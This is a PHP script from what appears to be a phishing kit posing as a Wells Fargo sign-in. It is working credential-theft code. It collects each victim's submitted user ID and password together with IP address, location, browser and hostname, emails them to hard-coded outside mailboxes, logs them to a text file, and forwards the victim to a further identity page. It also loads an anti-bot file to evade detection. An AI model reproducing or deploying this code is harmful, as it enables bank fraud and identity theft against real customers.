<?
session_start();
include 'antibots.php';

if($_SERVER['REQUEST_METHOD'] != "POST") {
    header("HTTP/1.0 403 Forbidden");
    print("Forbidden");
    exit();
}

if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
$agent =$_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g:i a");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$hostname = gethostbyaddr($ip);
$message  = "---------------+ Wells Fargo +--------------\n";
$message .= "User ID: ".$_POST['west']."\n";
$message .= "Password: ".$_POST['girl']."\n";
$message .= "IP: ".$ip."\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser: ".$agent."\n";
$message .= "DateTime: ".$timedate."\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created By WeStGiRl0003-----------------\n";
$send = "westgirl0001@aol.com,westgirl0001@gmail.com";
$subject = "Wells Fargo $ip | ".$_POST['west']." ".$_POST['girl']."\n";
$headers = "From: Ali<logs@o2.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail(','.$form,$subject,$message);
    $text = fopen('westgirl.txt', 'a');
fwrite($text, $message);
mail("$send", "$subject", $message);

header("Location: identity.php?&".generateRandomString(200));
	  